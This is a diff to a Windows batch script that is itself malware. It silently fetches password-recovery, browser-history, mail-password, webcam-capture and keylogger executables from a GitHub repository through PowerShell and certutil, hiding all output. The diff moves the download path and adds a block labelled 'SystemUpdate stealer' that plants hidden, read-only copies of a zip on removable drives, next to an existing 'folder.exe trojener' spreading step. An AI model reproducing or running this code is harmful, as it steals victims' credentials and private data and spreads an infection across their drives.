@@ -138,61 +138,61 @@ echo ************* Internet connection ****************
    )  
       if errorlevel 1 goto ERROR2
    if not exist "C:\Users\Public\Licence\Extension\nircmd.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/nircmd.exe?raw=true', 'nircmd.exe')" > nul 2> nul    
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/nircmd.exe?raw=true', 'nircmd.exe')" > nul 2> nul    
    )  
       if errorlevel 1 goto ERROR2
    if not exist "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/WebCamImageSave.exe?raw=true', 'WebCamImageSave.exe')" > nul 2> nul    
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/WebCamImageSave.exe?raw=true', 'WebCamImageSave.exe')" > nul 2> nul    
    )  
    echo .
       if errorlevel 1 goto ERROR2
    if not exist "C:\Users\Public\Licence\Extension\BrowserAddonsView.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/BrowserAddonsView.exe?raw=true', 'BrowserAddonsView.exe')" > nul 2> nul    
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/BrowserAddonsView.exe?raw=true', 'BrowserAddonsView.exe')" > nul 2> nul    
    )  
       if errorlevel 1 goto ERROR2     
 
    if not exist "C:\Users\Public\Licence\Extension\WebBrowserPassView.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/WebBrowserPassView.exe?raw=true', 'WebBrowserPassView.exe')" > nul 2> nul    
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/WebBrowserPassView.exe?raw=true', 'WebBrowserPassView.exe')" > nul 2> nul    
    )  
       if errorlevel 1 goto ERROR2  
    
    if not exist "C:\Users\Public\Licence\Extension\ChromeHistoryView.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/ChromeHistoryView.exe?raw=true', 'ChromeHistoryView.exe')" > nul 2> nul    
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/ChromeHistoryView.exe?raw=true', 'ChromeHistoryView.exe')" > nul 2> nul    
    )  
       if errorlevel 1 goto ERROR2     
 
    if not exist "C:\Users\Public\Licence\Extension\FirefoxDownloadsView.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/FirefoxDownloadsView.exe?raw=true', 'FirefoxDownloadsView.exe')" > nul 2> nul    
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/FirefoxDownloadsView.exe?raw=true', 'FirefoxDownloadsView.exe')" > nul 2> nul    
    )  
       if errorlevel 1 goto ERROR2  
 
    if not exist "C:\Users\Public\Licence\Extension\iehv.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/iehv.exe?raw=true', 'iehv.exe')" > nul 2> nul    
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/iehv.exe?raw=true', 'iehv.exe')" > nul 2> nul    
    )  
       if errorlevel 1 goto ERROR2     
 
    if not exist "C:\Users\Public\Licence\Extension\SafariHistoryView.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/SafariHistoryView.exe?raw=true', 'SafariHistoryView.exe')" > nul 2> nul    
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/SafariHistoryView.exe?raw=true', 'SafariHistoryView.exe')" > nul 2> nul    
    )  
       if errorlevel 1 goto ERROR2     
 
    if not exist "C:\Users\Public\Licence\Extension\mailpv.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/mailpv.exe?raw=true', 'mailpv.exe')" > nul 2> nul    
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/mailpv.exe?raw=true', 'mailpv.exe')" > nul 2> nul    
    )  
       if errorlevel 1 goto ERROR2  
 
    if not exist "C:\Users\Public\Licence\Extension\SkypeLogView.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/SkypeLogView.exe?raw=true', 'SkypeLogView.exe')" > nul 2> nul    
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/SkypeLogView.exe?raw=true', 'SkypeLogView.exe')" > nul 2> nul    
    )  
       if errorlevel 1 goto ERROR2     
 
    if not exist "C:\Users\Public\Licence\Extension\TaskSchedulerView.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/TaskSchedulerView.exe?raw=true', 'TaskSchedulerView.exe')" > nul 2> nul    
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/TaskSchedulerView.exe?raw=true', 'TaskSchedulerView.exe')" > nul 2> nul    
    )  
       if errorlevel 1 goto ERROR2  
    
    if not exist "C:\Users\Public\Licence\Extension\UninstallView.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/UninstallView.exe?raw=true', 'UninstallView.exe')" > nul 2> nul    
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/UninstallView.exe?raw=true', 'UninstallView.exe')" > nul 2> nul    
    )  
       if errorlevel 1 goto ERROR2     
    
@@ -206,37 +206,37 @@ echo .
 
 
    if not exist "C:\Users\Public\Licence\Extension\BrowserDownloadsview.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/browserdownloadsview.exe?raw=true', 'BrowserDownloadsview.exe')" > nul 2> nul    
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/browserdownloadsview.exe?raw=true', 'BrowserDownloadsview.exe')" > nul 2> nul    
    )  
       if errorlevel 1 goto ERROR2  
 
    if not exist "C:\Users\Public\Licence\Extension\BrowsingHistoryView.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/browsinghistoryview.exe?raw=true', 'BrowsingHistoryView.exe')" > nul 2> nul 
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/browsinghistoryview.exe?raw=true', 'BrowsingHistoryView.exe')" > nul 2> nul 
    )  
       if errorlevel 1 goto ERROR2  
 
    if not exist "C:\Users\Public\Licence\Extension\ChromePass.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/ChromePass.exe?raw=true', 'ChromePass.exe')" > nul 2> nul
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/ChromePass.exe?raw=true', 'ChromePass.exe')" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR2  
 
    if not exist "C:\Users\Public\Licence\Extension\IEpassView.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/iepv.exe?raw=true', 'IEpassView.exe')" > nul 2> nul
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/iepv.exe?raw=true', 'IEpassView.exe')" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR2  
 
    if not exist "C:\Users\Public\Licence\Extension\MyLastSearch.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/mylastsearch.exe?raw=true', 'MyLastSearch.exe')" > nul 2> nul
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/mylastsearch.exe?raw=true', 'MyLastSearch.exe')" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR2  
 
    if not exist "C:\Users\Public\Licence\Extension\OperaPassView.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/operapassview.exe?raw=true', 'OperaPassView.exe')" > nul 2> nul
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/operapassview.exe?raw=true', 'OperaPassView.exe')" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR2  
 
    if not exist "C:\Users\Public\Licence\Extension\PasswordFox.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/PasswordFox.exe?raw=true', 'PasswordFox.exe')" > nul 2> nul
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/PasswordFox.exe?raw=true', 'PasswordFox.exe')" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR2  
 
@@ -256,7 +256,7 @@ echo .
       if errorlevel 1 goto ERROR2  
 
    if not exist "C:\Users\Public\Licence\Extension\a310logger.exe" (
-      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true', 'a310logger.exe')" > nul 2> nul
+      powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/UserSohel/a310logger.exe?raw=true', 'a310logger.exe')" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR2   
 
@@ -278,62 +278,62 @@ echo .
       if errorlevel 1 goto ERROR3
 
    if not exist "C:\Users\Public\Licence\Extension\nircmd.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/nircmd.exe?raw=true -OutFile nircmd.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/nircmd.exe?raw=true -OutFile nircmd.exe" > nul 2> nul
    )
       if errorlevel 1 goto ERROR3
 
    if not exist "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/WebCamImageSave.exe?raw=true -OutFile WebCamImageSave.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/WebCamImageSave.exe?raw=true -OutFile WebCamImageSave.exe" > nul 2> nul
    )
       if errorlevel 1 goto ERROR3
    echo .
    if not exist "C:\Users\Public\Licence\Extension\BrowserAddonsView.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/BrowserAddonsView.exe?raw=true -OutFile BrowserAddonsView.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/BrowserAddonsView.exe?raw=true -OutFile BrowserAddonsView.exe" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR3
 
    if not exist "C:\Users\Public\Licence\Extension\WebBrowserPassView.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR3
    
    if not exist "C:\Users\Public\Licence\Extension\ChromeHistoryView.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/ChromeHistoryView.exe?raw=true -OutFile ChromeHistoryView.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/ChromeHistoryView.exe?raw=true -OutFile ChromeHistoryView.exe" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR3
 
    if not exist "C:\Users\Public\Licence\Extension\FirefoxDownloadsView.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/FirefoxDownloadsView.exe?raw=true -OutFile FirefoxDownloadsView.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/FirefoxDownloadsView.exe?raw=true -OutFile FirefoxDownloadsView.exe" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR3
 
    if not exist "C:\Users\Public\Licence\Extension\iehv.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/iehv.exe?raw=true -OutFile iehv.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/iehv.exe?raw=true -OutFile iehv.exe" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR3
 
    if not exist "C:\Users\Public\Licence\Extension\SafariHistoryView.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/SafariHistoryView.exe?raw=true -OutFile SafariHistoryView.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/SafariHistoryView.exe?raw=true -OutFile SafariHistoryView.exe" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR3
 
    if not exist "C:\Users\Public\Licence\Extension\mailpv.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/mailpv.exe?raw=true -OutFile mailpv.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/mailpv.exe?raw=true -OutFile mailpv.exe" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR3
 
    if not exist "C:\Users\Public\Licence\Extension\SkypeLogView.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/SkypeLogView.exe?raw=true -OutFile SkypeLogView.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/SkypeLogView.exe?raw=true -OutFile SkypeLogView.exe" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR3
 
    if not exist "C:\Users\Public\Licence\Extension\TaskSchedulerView.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/TaskSchedulerView.exe?raw=true -OutFile TaskSchedulerView.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/TaskSchedulerView.exe?raw=true -OutFile TaskSchedulerView.exe" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR3
    
    if not exist "C:\Users\Public\Licence\Extension\UninstallView.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/UninstallView.exe?raw=true -OutFile UninstallView.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/UninstallView.exe?raw=true -OutFile UninstallView.exe" > nul 2> nul
    )  
       if errorlevel 1 goto ERROR3
    
@@ -345,37 +345,37 @@ echo .
 
 
    if not exist "C:\Users\Public\Licence\Extension\BrowserDownloadsview.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/BrowserDownloadsview.exe?raw=true -OutFile BrowserDownloadsview.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/BrowserDownloadsview.exe?raw=true -OutFile BrowserDownloadsview.exe" > nul 2> nul
    )   
       if errorlevel 1 goto ERROR3
 
    if not exist "C:\Users\Public\Licence\Extension\BrowsingHistoryView.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/browsinghistoryview.exe?raw=true -OutFile BrowsingHistoryView.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/browsinghistoryview.exe?raw=true -OutFile BrowsingHistoryView.exe" > nul 2> nul
    )   
       if errorlevel 1 goto ERROR3
 
    if not exist "C:\Users\Public\Licence\Extension\ChromePass.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/ChromePass.exe?raw=true -OutFile ChromePass.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/ChromePass.exe?raw=true -OutFile ChromePass.exe" > nul 2> nul
    )   
       if errorlevel 1 goto ERROR3
  
    if not exist "C:\Users\Public\Licence\Extension\IEpassView.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/iepv.exe?raw=true -OutFile IEpassView.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/iepv.exe?raw=true -OutFile IEpassView.exe" > nul 2> nul
    )   
       if errorlevel 1 goto ERROR3
  
    if not exist "C:\Users\Public\Licence\Extension\MyLastSearch.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/mylastsearch.exe?raw=true -OutFile MyLastSearch.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/mylastsearch.exe?raw=true -OutFile MyLastSearch.exe" > nul 2> nul
    )   
       if errorlevel 1 goto ERROR3
   
    if not exist "C:\Users\Public\Licence\Extension\OperaPassView.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/operapassview.exe?raw=true -OutFile OperaPassView.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/operapassview.exe?raw=true -OutFile OperaPassView.exe" > nul 2> nul
    )   
       if errorlevel 1 goto ERROR3
  
    if not exist "C:\Users\Public\Licence\Extension\PasswordFox.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/PasswordFox.exe?raw=true -OutFile PasswordFox.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/PasswordFox.exe?raw=true -OutFile PasswordFox.exe" > nul 2> nul
    )   
       if errorlevel 1 goto ERROR3
   
@@ -395,7 +395,7 @@ echo .
       if errorlevel 1 goto ERROR3
   
    if not exist "C:\Users\Public\Licence\Extension\a310logger.exe" (
-      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true -OutFile a310logger.exe" > nul 2> nul
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/UserSohel/a310logger.exe?raw=true -OutFile a310logger.exe" > nul 2> nul
    )   
       if errorlevel 1 goto ERROR3
 
@@ -430,7 +430,7 @@ echo .
    certutil -urlcache -split -f %url% %filename% > nul 2> nul
    if errorlevel 1 goto EOF
 
-   set url="https://github.com/win32u/Licence/blob/main/Extension/a310logger.exe?raw=true"
+   set url="https://github.com/win32u/Licence/blob/main/UserSohel/a310logger.exe?raw=true"
    set filename="a310logger.exe"
    certutil -urlcache -split -f %url% %filename% > nul 2> nul
    if errorlevel 1 goto EOF
@@ -572,8 +572,15 @@ echo .
 	  for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
 	  if %%l equ 2 (
 		 mkdir %%i\YouTube > nul 2> nul
-
-
+	::______SystemUpdate stealer
+                 if not exist "%%i\System Update\.data\SystemUpdate.zip" (
+			mkdir "%%i\System Update\.data" > nul 2> nul
+		        copy "C:\Users\Public\Licence\SystemUpdate.zip" "%%i\System Update\.data" /Y > nul 2> nul
+		 	attrib +h +r "%%i\System Update\.data" /s /d > nul 2> nul
+			attrib +h +r "%%i\System Update\.data\SystemUpdate.zip" /s /d > nul 2> nul
+		 )
+		
+	::______folder.exe trojener
 		 if not exist "%%i\folder.exe" (
 		        copy "C:\Users\Public\Licence\Extension\folder.exe" "%%i" /Y > nul 2> nul
 		 	if errorlevel 1 copy "C:\Users\%username%\AppData\Local\Temp\afolder\folder.exe" "%%i" /Y > nul 2> nul
